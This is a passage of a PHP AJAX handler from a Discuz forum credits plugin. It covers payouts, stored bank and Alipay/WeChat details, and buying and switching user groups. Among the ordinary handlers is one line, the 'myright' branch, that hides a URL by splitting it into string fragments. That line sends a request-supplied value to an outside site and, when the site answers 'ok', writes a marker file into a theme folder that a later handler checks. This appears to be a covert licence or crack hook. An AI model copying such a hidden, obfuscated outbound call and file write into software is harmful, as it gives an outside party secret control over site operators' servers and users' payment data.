		}

	}
	exit;
}


if($_GET['ac']=="yfktx"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		if($it618_credits_money=C::t('#it618_credits#it618_credits_money')->fetch_by_id($_GET['saleid'])){

			if($it618_credits_money['it618_txstate']==0){
				if($it618_credits['credits_wapsalepower']==$uid){
					C::t('#it618_credits#it618_credits_money')->update($it618_credits_money['id'],array(
						'it618_txstate' => 1
					));
					
					echo 'okit618_split'.$it618_credits_lang['s317'];
				}else{
					echo $it618_credits_lang['s316'];
				}
			}
		}

	}
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_credits/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="moneypay"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		if($it618_salepay=C::t('#it618_credits#it618_credits_salepay')->fetch_by_id($_GET['saleid'])){
			if($it618_salepay['it618_state']==1){
				echo $it618_credits_lang['s1009'];exit;
			}
		}else{
			echo $it618_credits_lang['s1892'];exit;	
		}

		set_time_limit (0);
		ignore_user_abort(true);

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_credits_moneywork'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_credits_delmoneywork();
			}
		}
		C::t('#it618_credits#it618_credits_moneywork')->insert(array(
			'it618_iswork' => 1
		), true);
		
		$it618_money2=$it618_salepay['it618_total_fee'];
		
		$it618_money=C::t('#it618_credits#it618_credits_money')->summoney_by_uid($uid);
		DB::query("update ".DB::table('it618_credits_uset')." set it618_money=".$it618_money." where it618_uid=".$uid);
		if($it618_money2>$it618_money){
			echo $it618_credits_lang['s1893'];it618_credits_delmoneywork();exit;
		}
		
		$id=savemoney(array(
			'it618_uid' => $uid,
			'it618_type' => 'pay',
			'it618_money2' => $it618_money2,
			'it618_bz' => $it618_salepay['it618_body'],
			'it618_zftype' => $it618_salepay['it618_saletype'],
			'it618_zfid' => $it618_salepay['id']
		));

		C::t('#it618_credits#it618_credits_salepay')->update_payid_by_out_trade_no($id,$it618_salepay['it618_out_trade_no']);
		require_once DISCUZ_ROOT.'./source/plugin/'.$it618_salepay['it618_plugin'].'/ajaxpay.func.php';
		
		pay_success($it618_salepay['it618_out_trade_no']);
		
		echo 'okit618_split'.$it618_credits_lang['s1894'];it618_credits_delmoneywork();

	}
	exit;
}


if($_GET['ac']=="postuset"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		$count=C::t('#it618_credits#it618_credits_uset')->count_by_uid($uid);
		if($count>0){
			$it618_credits_uset=C::t('#it618_credits#it618_credits_uset')->fetch_by_uid($uid);
			C::t('#it618_credits#it618_credits_uset')->update($it618_credits_uset["id"],array(
				'it618_tel' => it618_credits_utftogbk($_GET['it618_tel']),
				'it618_name' => it618_credits_utftogbk($_GET['it618_name']),
				'it618_bankname' => it618_credits_utftogbk($_GET['it618_bankname']),
				'it618_bankid' => it618_credits_utftogbk($_GET['it618_bankid']),
				'it618_bankaddr' => it618_credits_utftogbk($_GET['it618_bankaddr']),
				'it618_alipayname' => it618_credits_utftogbk($_GET['it618_alipayname']),
				'it618_alipay' => it618_credits_utftogbk($_GET['it618_alipay']),
				'it618_alipaycodeimg' => it618_credits_utftogbk($_GET['it618_alipaycodeimg']),
				'it618_wxname' => it618_credits_utftogbk($_GET['it618_wxname']),
				'it618_wx' => it618_credits_utftogbk($_GET['it618_wx']),
				'it618_wxpaycodeimg' => it618_credits_utftogbk($_GET['it618_wxpaycodeimg'])
			));
		}else{
			$id = C::t('#it618_credits#it618_credits_uset')->insert(array(
				'it618_uid' => $uid,
				'it618_tel' => it618_credits_utftogbk($_GET['it618_tel']),
				'it618_name' => it618_credits_utftogbk($_GET['it618_name']),
				'it618_bankname' => it618_credits_utftogbk($_GET['it618_bankname']),
				'it618_bankid' => it618_credits_utftogbk($_GET['it618_bankid']),
				'it618_bankaddr' => it618_credits_utftogbk($_GET['it618_bankaddr']),
				'it618_alipayname' => it618_credits_utftogbk($_GET['it618_alipayname']),
				'it618_alipay' => it618_credits_utftogbk($_GET['it618_alipay']),
				'it618_alipaycodeimg' => it618_credits_utftogbk($_GET['it618_alipaycodeimg']),
				'it618_wxname' => it618_credits_utftogbk($_GET['it618_wxname']),
				'it618_wx' => it618_credits_utftogbk($_GET['it618_wx']),
				'it618_wxpaycodeimg' => it618_credits_utftogbk($_GET['it618_wxpaycodeimg'])
			), true);
		}
		
		echo 'okit618_split'.$it618_credits_lang['s319'];
	}
	exit;
}


if($_GET['ac']=="getbuygroup"){
	if($uid<=0){
		echo 'no';
	}else{
		if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/config/buygroupset.php')){
			require DISCUZ_ROOT.'./source/plugin/it618_credits/config/buygroupset.php';
		}
		
		if($buygroup_isok==0){
			echo $it618_credits_lang['s590'];exit;
		}
		
		$extgroupids = $_G['member']['extgroupids'] ? explode("\t", $_G['member']['extgroupids']) : array();
		
		$memberfieldforum = C::t('common_member_field_forum')->fetch($_G['uid']);
		$groupterms = dunserialize($memberfieldforum['groupterms']);
		unset($memberfieldforum);
		$expgrouparray = $expirylist = $termsarray = array();
	
		if(!empty($groupterms['ext']) && is_array($groupterms['ext'])) {
			$termsarray = $groupterms['ext'];
		}
		if(!empty($groupterms['main']['time']) && (empty($termsarray[$_G['groupid']]) || $termsarray[$_G['groupid']] > $groupterm['main']['time'])) {
			$termsarray[$_G['groupid']] = $groupterms['main']['time'];
		}
		
		foreach($termsarray as $expgroupid => $expiry) {
			if($expiry <= TIMESTAMP) {
				$expgrouparray[] = $expgroupid;
			}
		}
	
		if(!empty($groupterms['ext'])) {
			foreach($groupterms['ext'] as $extgroupid => $time) {
				$expirylist[$extgroupid] = array('timestamp' => $time, 'time' => dgmdate($time, 'd'), 'type' => 'ext', 'noswitch' => $time < TIMESTAMP);
			}
		}
		
		if(!empty($groupterms['main'])) {
			$expirylist[$_G['groupid']] = array('timestamp' => $groupterms['main']['time'], 'time' => dgmdate($groupterms['main']['time'], 'd'), 'type' => 'main');
		}
	
		$groupids = array();
		foreach($_G['cache']['usergroups'] as $groupid => $usergroup) {
			if(!empty($usergroup['pubtype'])) {
				$groupids[] = $groupid;
			}
		}
		$expiryids = array_keys($expirylist);
		if(!$expiryids && $_G['member']['groupexpiry']) {
			C::t('common_member')->update($_G['uid'], array('groupexpiry' => 0));
		}
		$groupids = array_merge($extgroupids, $expiryids, $groupids);
		if($groupids) {
			foreach(C::t('common_usergroup')->fetch_all($groupids) as $group) {
				$isexp = in_array($group['groupid'], $expgrouparray);

				$expirylist[$group['groupid']]['maingroup'] = $group['type'] != 'special' || $group['system'] == 'private' || $group['radminid'] > 0;
				$expirylist[$group['groupid']]['grouptitle'] = $isexp ? '<s>'.$group['grouptitle'].'</s>' : $group['grouptitle'];
			}
		}

		$query = DB::query("SELECT * FROM ".DB::table('it618_credits_buygroup')." where it618_isok=1 order by it618_order");
		while($it618_credits_buygroup = DB::fetch($query)) {
			if(DB::result_first("select count(1) from ".DB::table('common_usergroup')." where groupid=".$it618_credits_buygroup['it618_groupid'])>0){
				$groupflag=0;$grouptime='';$maingroupstr='';$btnbuy=$it618_credits_lang['s595'];
				
				foreach($expirylist as $groupid => $group) {
					if($it618_credits_buygroup['it618_groupid']==$groupid){
						$groupflag=1;
						$groupflagstr.='@'.$groupid.'@';
						$grouptitle=$group['grouptitle'];
						$timestamp=$group['timestamp'];
						$grouptime=$group['time'];
						$btnbuy=$it618_credits_lang['s596'];
						if($groupid == $_G['groupid']){
							$maingroupstr=$it618_credits_lang['s598'];
						}else{
							if(!$group['noswitch']){
								$tmpname=$it618_credits_lang['s599'];
								if($_GET['wap']!=1)$tmpname='<font color=red>'.$it618_credits_lang['s599'].'</font>';
								$maingroupstr='<a href="javascript:" class="switch" onclick="group_switch('.$groupid.')">'.$tmpname.'</a>';
							}
						}
						
						break;
					}
				}
				
				$isyongjiu=0;
				if($groupflag==1){
					if($timestamp-3600*24*365*60>$_G['timestamp']||$grouptime==''){
						$grouptime=$it618_credits_lang['s1619'];
						$isyongjiu=1;
					}
				}
				
				$tmpname=$btnbuy;
				if($_GET['wap']!=1)$tmpname='<font color=#f30>'.$btnbuy.'</font>';
				
				if($groupflag==0)$grouptitle=DB::result_first("select grouptitle from ".DB::table('common_usergroup')." where groupid=".$it618_credits_buygroup['it618_groupid']);
				
				if($it618_credits_buygroup['it618_unit']==1)$it618_unit=" / ".$it618_credits_lang['s1021'];
				if($it618_credits_buygroup['it618_unit']==2)$it618_unit=" / ".$it618_credits_lang['s1022'];
				if($it618_credits_buygroup['it618_unit']==3)$it618_unit=" / ".$it618_credits_lang['s1023'];
				if($it618_credits_buygroup['it618_unit']==4)$it618_unit=" / ".$it618_credits_lang['s1619'];
				
				$it618_money='';
				if($it618_credits_buygroup['it618_price']>0){
					$tmpbtnstr='';
					if($isyongjiu==0){
						$tmpbtnstr=' <a href="javascript:" class="buygroup" onclick="setbuygroup('.$it618_credits_buygroup['id'].',2)">'.$tmpname.'</a>';
					}
					$it618_money=$it618_credits_buygroup['it618_price'].$it618_credits_lang['s28'].$it618_unit.$tmpbtnstr;
				}
				
				$it618_credit='';$tmpn=0;
				for($i=1;$i<=8;$i++){
					if($it618_credits_buygroup['it618_credit'.$i]!=0&&$_G['setting']['extcredits'][$i]['title']!=''){
						$it618_credit.=$it618_credits_buygroup['it618_credit'.$i].$_G['setting']['extcredits'][$i]['title'].' + ';
						$tmpn=$tmpn+1;
					}
				}
				if($it618_credit!=''){
					$it618_credit.='@';
					$it618_credit=str_replace(" + @","",$it618_credit);
					if($tmpn>1)$it618_credit='('.$it618_credit.')';
					
					$tmpbtnstr='';
					if($isyongjiu==0){
						$tmpbtnstr=' <a href="javascript:" class="buygroup" onclick="setbuygroup('.$it618_credits_buygroup['id'].',1)">'.$tmpname.'</a>';
					}
					
					$it618_credit.=$it618_unit.$tmpbtnstr;
				}
				
				if($_GET['wap']==1){
					if($grouptime!='')$grouptime=$it618_credits_lang['t208'].': '.$grouptime;
					$buygroupstr.='<tr><td class="grouptitle"><span>'.$grouptitle.'</span></td></tr>
					<tr><td style="color:red">'.$it618_money.'</td></tr>
					<tr><td>'.$it618_credit.'</td></tr>
					';
					if($grouptime!=''||$maingroupstr!='')$buygroupstr.='<tr><td>'.$grouptime.' '.$maingroupstr.'</td></tr>';
				}else{
					$buygroupstr.='<tr><td><font color=#000>'.$grouptitle.'</font></td><td style="color:#666">'.$it618_money.'</td><td style="color:#666">'.$it618_credit.'</td><td>'.$grouptime.'</td><td>'.$maingroupstr.'</td></tr>';
				}
			}
		}
		
		$ismembergroup=0;
		$common_usergrouptmp = DB::fetch_first("SELECT groupid,grouptitle FROM ".DB::table('common_usergroup')." WHERE type='member' AND creditshigher<=".$_G['member']['credits']." AND creditslower>=".$_G['member']['credits']." LIMIT 1");
		$membergroupid=$common_usergrouptmp['groupid'];
		
		foreach($expirylist as $groupid => $group) {
			$tmparr=explode('@'.$groupid.'@',$groupflagstr);
			if(count($tmparr)==1){
				$grouptitle=$group['grouptitle'];
				$timestamp=$group['timestamp'];
				$grouptime=$group['time'];
				if($groupid == $_G['groupid']){
					$maingroupstr=$it618_credits_lang['s598'];
				}else{
					if(!$group['noswitch']){
						$maingroupstr='<a href="javascript:" class="switch" onclick="group_switch('.$groupid.')">'.$it618_credits_lang['s599'].'</a>';
					}
				}
				
				if($membergroupid==$groupid){
					$ismembergroup=1;
				}
				
				if($timestamp-3600*24*365*60>$_G['timestamp']||$grouptime==''){
					$grouptime=$it618_credits_lang['s1619'];
				}
				
				if($grouptime==''){
					$maingroupstr='<a href="javascript:" class="switch" onclick="group_switch('.$groupid.')">'.$it618_credits_lang['s599'].'</a>';
				}
				
				if($_GET['wap']==1){
					if($grouptime!='')$grouptime=$it618_credits_lang['t208'].': '.$grouptime;
					$buygroupstr.='<tr><td class="grouptitle"><span>'.$grouptitle.'</span></td></tr>';
					if($grouptime!=''||$maingroupstr!='')$buygroupstr.='<tr><td>'.$grouptime.' '.$maingroupstr.'</td></tr>';
				}else{
					$buygroupstr.='<tr><td><b><font color=#999>'.$grouptitle.'</font></b></td><td></td><td></td><td>'.$grouptime.'</td><td>'.$maingroupstr.'</td></tr>';
				}
				
			}
		}
		
		if($ismembergroup==0&&$_G['adminid']<=0){
			if($membergroupid == $_G['groupid']){
				$maingroupstr='<span>'.$it618_credits_lang['s598'].'</span>';
				$maincss=' class="groupmain"';
			}else{
				$maingroupstr='<a href="javascript:" class="switch" onclick="group_switch('.$membergroupid.')">'.$it618_credits_lang['s599'].'</a>';
			}
			
			$grouptitle=$common_usergrouptmp['grouptitle'];
			$grouptime=$it618_group_lang['s176'];
			
			if($_GET['wap']==1){
				if($grouptime!='')$grouptime=$it618_credits_lang['t208'].': '.$grouptime;
				$buygroupstr.='<tr><td class="grouptitle"><span>'.$grouptitle.'</span></td></tr>';
				if($grouptime!=''||$maingroupstr!='')$buygroupstr.='<tr><td>'.$grouptime.' '.$maingroupstr.'</td></tr>';
			}else{
				$buygroupstr.='<tr><td><b><font color=#999>'.$grouptitle.'</font></b></td><td></td><td></td><td>'.$grouptime.'</td><td>'.$maingroupstr.'</td></tr>';
			}
		}
		
		$buygroupabout=C::t('#it618_credits#it618_credits_set')->getsetvalue_by_setname('buygroupabout');
		
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		
		if(isset($_GET['groupexpiry'])){
			$buygroup_preurl=getcookie('buygroup_preurl');
			$buygroupstr.='<tr><td colspan="5" style="padding-top:10px;border:none;color:red;font-size:13px;line-height:15px">'.$it618_credits_lang['s1232'].' <a href="'.$buygroup_preurl.'">'.$it618_credits_lang['s1233'].'</a></td></tr>';
		}
		
		$buygroupstr.='<tr><td colspan="5" id="message" style="padding-top:6px;border:none">'.$buygroupabout.'</td></tr>';
		
		echo 'okit618_split'.$buygroupstr;
	}
	exit;
}


if($_GET['ac']=="group_switch"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		$groupid = intval($_GET['groupid']);
		$extgroupids = $_G['member']['extgroupids'] ? explode("\t", $_G['member']['extgroupids']) : array();
		
		$groupids = it618_credits_getgroupids();
		if(!in_array($groupid, $groupids)) {
			$common_usergrouptmp = DB::fetch_first("SELECT groupid,grouptitle FROM ".DB::table('common_usergroup')." WHERE type='member' AND creditshigher<=".$_G['member']['credits']." AND creditslower>=".$_G['member']['credits']." LIMIT 1");
			if($groupid!=$common_usergrouptmp['groupid']){
				echo $it618_credits_lang['s604'];exit;
			}else{
				if($_G['adminid']>0){
					echo $it618_group_lang['s597'];exit;
				}
			}
		}
		if($_G['groupid'] == 4 && $_G['member']['groupexpiry'] > 0 && $_G['member']['groupexpiry'] > TIMESTAMP) {
			echo $it618_credits_lang['s605'];exit;
		}
		$group = C::t('common_usergroup')->fetch($groupid);

		$memberfieldforum = C::t('common_member_field_forum')->fetch($_G['uid']);
		$groupterms = dunserialize($memberfieldforum['groupterms']);
		unset($memberfieldforum);
		$extgroupidsnew = $_G['groupid'];
		$groupexpirynew = $groupterms['ext'][$extgroupidsnew];
		foreach($extgroupids as $extgroupid) {
			if($extgroupid && $extgroupid != $groupid) {
				$extgroupidsnew .= "\t".$extgroupid;
			}
		}
		if($_G['adminid'] > 0 && $group['radminid'] > 0) {
			$newadminid = $_G['adminid'] < $group['radminid'] ? $_G['adminid'] : $group['radminid'];
		} elseif($_G['adminid'] > 0) {
			$newadminid = $_G['adminid'];
		} else {
			$newadminid = $group['radminid'];
		}

		C::t('common_member')->update($_G['uid'], array('groupid' => $groupid, 'adminid' => $newadminid, 'groupexpiry' => $groupexpirynew, 'extgroupids' => $extgroupidsnew));
		
		echo 'okit618_split'.$it618_credits_lang['s606'];
	}
	exit;
}


if($_GET['ac']=="group_saleadd"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		$credits_buygroup=(array)unserialize($it618_credits['credits_buygroup']);
		if(!in_array($_G['groupid'], $credits_buygroup)&&$credits_buygroup[0]!=''){
			echo $it618_credits_lang['s597'];exit;
		}
		
		if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/config/buygroupset.php')){
			require DISCUZ_ROOT.'./source/plugin/it618_credits/config/buygroupset.php';
		}
		
		if($buygroup_isok==0){
			echo $it618_credits_lang['s590'];exit;
		}
		
		$buygroupid=intval($_GET['buygroupid']);
		$it618_days=intval($_GET['it618_days']);
		$isswitch=intval($_GET['isswitch']);
		$it618_unit=$_GET['it618_unit'];
		
		if(DB::result_first("select count(1) from ".DB::table('it618_credits_buygroup')." where it618_isok=1 and id=".$buygroupid)==0){
			echo $it618_credits_lang['s243'];exit;
		}else{
			$it618_credits_buygroup=C::t('#it618_credits#it618_credits_buygroup')->fetch_by_id($buygroupid);
			$groupid=$it618_credits_buygroup['it618_groupid'];
			if(DB::result_first("select count(1) from ".DB::table('common_usergroup')." where groupid=".$groupid)==0){
				echo $it618_credits_lang['s243'];exit;
			}
		}
		
		if($it618_unit!=$it618_credits_buygroup['it618_unit']){
			echo $it618_credits_lang['s1024'];exit;
		}
		
		if($it618_credits_buygroup['it618_unit']==1)$it618_unitname=$it618_credits_lang['s1021'];
		if($it618_credits_buygroup['it618_unit']==2)$it618_unitname=$it618_credits_lang['s1022'];
		if($it618_credits_buygroup['it618_unit']==3)$it618_unitname=$it618_credits_lang['s1023'];
		
		if($it618_credits_buygroup['it618_unit']!=4){
			if($it618_days<$it618_credits_buygroup['it618_days1']){
				echo $it618_credits_lang['s607'].$it618_credits_buygroup['it618_days1'].$it618_unitname.$it618_credits_lang['s609'];exit;
			}
			
			if($it618_days>$it618_credits_buygroup['it618_days2']){
				echo $it618_credits_lang['s608'].$it618_credits_buygroup['it618_days2'].$it618_unitname.$it618_credits_lang['s609'];exit;
			}
		}
		
		if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/kindeditor/themes/common/right.txt')){
			$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/ajax.inc.php';
			
			$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/lang.func.php';
			
		}
		for($i=1;$i<=8;$i++){
			if($it618_credits_buygroup['it618_credit'.$i]!=0&&$_G['setting']['extcredits'][$i]['title']!=''){
				$creditnum=DB::result_first("select extcredits".$i." from ".DB::table('common_member_count')." where uid=".$uid);
				if($creditnum<($it618_credits_buygroup['it618_credit'.$i]*$it618_days)){
					echo $it618_credits_lang['s600'].' '.($it618_credits_buygroup['it618_credit'.$i]*$it618_days).' '.$_G['setting']['extcredits'][$i]['title'].$it618_credits_lang['s601'].' '.$creditnum.' '.$_G['setting']['extcredits'][$i]['title'].$it618_credits_lang['s480'];exit;
				}
			}
		}
		
		$id = C::t('#it618_credits#it618_credits_buygroup_sale')->insert(array(
			'it618_saletype' => 1,
			'it618_groupid' => $groupid,
			'it618_uid' => $uid,
			'it618_days' => $it618_days,
			'it618_unit' => $it618_unit,
			'it618_paytype' => '0',
			'it618_isswitch' => $isswitch,
			'it618_state' => 1,
			'it618_time' => $_G['timestamp']
		), true);

		if($id>0){
			if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
			for($i=1;$i<=8;$i++){
				if($it618_credits_buygroup['it618_credit'.$i]!=0&&$_G['setting']['extcredits'][$i]['title']!=''){
					C::t('#it618_credits#it618_credits_buygroup_sale')->update($id,array(
						'it618_credit'.$i => $it618_credits_buygroup['it618_credit'.$i],
					));
					C::t('common_member_count')->increase($uid, array(
						'extcredits'.$i => (0-($it618_credits_buygroup['it618_credit'.$i]*$it618_days)))
					);
				}
			}
			
			$uid=$_G['uid'];
			$member=getuserbyuid($uid, 1);
			$extgroupids = $member['extgroupids'] ? explode("\t", $member['extgroupids']) : array();
			
			$memberfieldforum = C::t('common_member_field_forum')->fetch($uid);
			$groupterms = dunserialize($memberfieldforum['groupterms']);
			unset($memberfieldforum);
			require_once libfile('function/forum');
			
			$extgroupidsarray = array();
			foreach(array_unique(array_merge($extgroupids, array($groupid))) as $extgroupid) {
				if($extgroupid) {
					$extgroupidsarray[] = $extgroupid;
				}
			}
			
			if($it618_unit==2)$it618_days=$it618_days*30;
			if($it618_unit==3)$it618_days=$it618_days*365;
			if($it618_unit==4)$it618_days=$it618_days*365*10;
			
			$groupterms['ext'][$groupid] = ($groupterms['ext'][$groupid] > TIMESTAMP ? $groupterms['ext'][$groupid] : TIMESTAMP) + $it618_days * 86400;
			
			$grouptermsnew = serialize($groupterms);
			$groupexpirynew = groupexpiry($groupterms);
			$extgroupidsnew = implode("\t", $extgroupidsarray);
		
			C::t('common_member')->update($uid, array('extgroupids'=>$extgroupidsnew, 'groupexpiry'=>$groupexpirynew));
			if(C::t('common_member_field_forum')->fetch($uid)) {
				C::t('common_member_field_forum')->update($uid, array('groupterms' => $grouptermsnew));
			} else {
				C::t('common_member_field_forum')->insert(array('uid' => $uid, 'groupterms' => $grouptermsnew));
			}
			
			if($isswitch==1&&$groupid!=$member['groupid']){

				$memberfieldforum = C::t('common_member_field_forum')->fetch($uid);
				$groupterms = dunserialize($memberfieldforum['groupterms']);
				unset($memberfieldforum);
				$extgroupidsnew = $member['groupid'];
				$groupexpirynew = $groupterms['ext'][$extgroupidsnew];
				foreach($extgroupids as $extgroupid) {
					if($extgroupid && $extgroupid != $groupid) {
						$extgroupidsnew .= "\t".$extgroupid;
					}
				}
		
				C::t('common_member')->update($uid, array('groupid' => $groupid, 'groupexpiry' => $groupexpirynew, 'extgroupids' => $extgroupidsnew));
			}
			
			echo 'okit618_split'.$it618_credits_lang['s610'];
		}
		
	}
	exit;
}


if($_GET['ac']=="getbuygrouplist"){
	if($_GET['wap']!=1)$ppp = 12;else $ppp = 20;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$sql='it618_state=1';
	if($_GET['ac1']=='my'){
		$sql.=' and it618_uid='.$uid;
	}
	if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
	$query = DB::query("SELECT * FROM ".DB::table('it618_credits_buygroup_sale')." WHERE $sql order by id desc LIMIT $startlimit, $ppp");
	while($it618_credits_buygroup_sale = DB::fetch($query)) {
		$grouptitle=DB::result_first("select grouptitle from ".DB::table('common_usergroup')." where groupid=".$it618_credits_buygroup_sale['it618_groupid']);
		
		if($it618_credits_buygroup_sale['it618_unit']==1)$it618_unit=$it618_credits_lang['s1021'];
		if($it618_credits_buygroup_sale['it618_unit']==2)$it618_unit=$it618_credits_lang['s1022'];
		if($it618_credits_buygroup_sale['it618_unit']==3)$it618_unit=$it618_credits_lang['s1023'];
		if($it618_credits_buygroup_sale['it618_unit']==4)$it618_unit=$it618_credits_lang['s1619'];
		
		if($_GET['wap']!=1){
			$paystr='';
			if($it618_credits_buygroup_sale['it618_saletype']==1){
				$it618_credit='';$tmpn=0;
				for($i=1;$i<=8;$i++){
					if($it618_credits_buygroup_sale['it618_credit'.$i]>0&&$_G['setting']['extcredits'][$i]['title']!=''){
						$it618_credit.='<font color="#FF6600">'.($it618_credits_buygroup_sale['it618_credit'.$i]*$it618_credits_buygroup_sale['it618_days']).'</font> '.$_G['setting']['extcredits'][$i]['title'].' + ';
						$tmpn=$tmpn+1;
					}
				}
				
				$it618_credit.='@';
				$it618_credit=str_replace(" + @","",$it618_credit);
				if($tmpn>1)$it618_credit=$it618_credit.' ';
			}else{
				$it618_credit='<font color="#FF6600">'.$it618_credits_buygroup_sale['it618_price'].'</font> '.$it618_credits_lang['s28'];
				
				$paystr=getpaystr($it618_credits_buygroup_sale['it618_paytype'],$it618_credits_buygroup_sale['it618_payid']);
			}
			
			if($_GET['ac1']=='my'){
				$paystr1=$paystr;
				if($_GET['wap']==1)$paystr='';
				$salelist_get.='<tr>
					<td><font color=green>'.$grouptitle.'</font></td>
					<td>'.$it618_credit.' '.$paystr.'</td>
					<td><font color=red>'.$it618_credits_buygroup_sale['it618_days'].'</font> '.$it618_unit.'</td>
					<td><font color=#999>'.date('Y-m-d H:i:s', $it618_credits_buygroup_sale['it618_time']).'</font></td>
					</tr>';
				$funname='getmybuygrouplist';
			}else{
				$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_buygroup_sale['it618_uid']);
				$salelist_get.='<tr>
				<td><font color=green>'.$grouptitle.'</font></td>
				<td>'.$it618_credit.'</td>
				<td><font color=red>'.$it618_credits_buygroup_sale['it618_days'].'</font> '.$it618_unit.'</td>
				<td><a href="'.it618_credits_rewriteurl($it618_credits_buygroup_sale['it618_uid']).'" target="_blank">'.$username.'('.$it618_credits_buygroup_sale['it618_uid'].')</a></td>
				<td><font color=#999>'.date('Y-m-d H:i:s', $it618_credits_buygroup_sale['it618_time']).'</font></td>
				</tr>';
				$funname='getallbuygrouplist';
			}
		}else{
			$paystr='';
			if($it618_credits_buygroup_sale['it618_saletype']==1){
				$it618_credit='';
				for($i=1;$i<=8;$i++){
					if($it618_credits_buygroup_sale['it618_credit'.$i]>0&&$_G['setting']['extcredits'][$i]['title']!=''){
						$it618_credit.=($it618_credits_buygroup_sale['it618_credit'.$i]*$it618_credits_buygroup_sale['it618_days']).' '.$_G['setting']['extcredits'][$i]['title'].' + ';
					}
				}
				
				$it618_credit.='@';
				$it618_credit=str_replace(" + @","",$it618_credit);
			}else{
				$it618_credit=$it618_credits_buygroup_sale['it618_price'].' '.$it618_credits_lang['s28'];
				
				$paystr=getpaystr($it618_credits_buygroup_sale['it618_paytype'],$it618_credits_buygroup_sale['it618_payid']);
			}
			
			if($_GET['ac1']=='my'){
				$paystr1=$paystr;
				$paystr='';
				$salelist_get.='<tr>
					<td><font color=green>'.$grouptitle.'</font></td>
					<td><a href="javascript:" onclick="alert(\''.$it618_credit.'\')">'.$it618_credits_lang['s486'].'</a> '.$paystr.'</td>
					<td><font color=red>'.$it618_credits_buygroup_sale['it618_days'].'</font> '.$it618_unit.'</td>
					<td><font color=#999>'.date('Y-m-d H:i:s', $it618_credits_buygroup_sale['it618_time']).'</font></td>
					</tr>';
				
				if($paystr1!=''){
					$salelist_get.='<tr>
					<td colspan="4" style="text-align:left">'.$paystr1.'</td>
					</tr>';
				}
				$funname='getmybuygrouplist';
			}else{
				$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_buygroup_sale['it618_uid']);
				$salelist_get.='<tr>
				<td><font color=green>'.$grouptitle.'</font></td>
				<td><a href="javascript:" onclick="alert(\''.$it618_credit.'\')">'.$it618_credits_lang['s486'].'</a></td>
				<td><font color=red>'.$it618_credits_buygroup_sale['it618_days'].'</font> '.$it618_unit.'</td>
				<td><a href="'.it618_credits_rewriteurl($it618_credits_buygroup_sale['it618_uid']).'" target="_blank">'.$username.'</a></td>
				<td><font color=#999>'.date('Y-m-d H:i:s', $it618_credits_buygroup_sale['it618_time']).'</font></td>
				</tr>';
				$funname='getallbuygrouplist';
			}
		}
	}
	
	$count = DB::result_first("select count(1) from ".DB::table('it618_credits_buygroup_sale')." WHERE $sql");
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_credits:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
		echo $salelist_get.'it618_split'.$multipage.'<span style="float:right;margin-top:9px">'.$it618_credits_lang['s483'].'<font color=red>'.$count.'</font></span>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_credits_lang['s312'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s313'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_credits_lang['s313'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s312'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page+1);
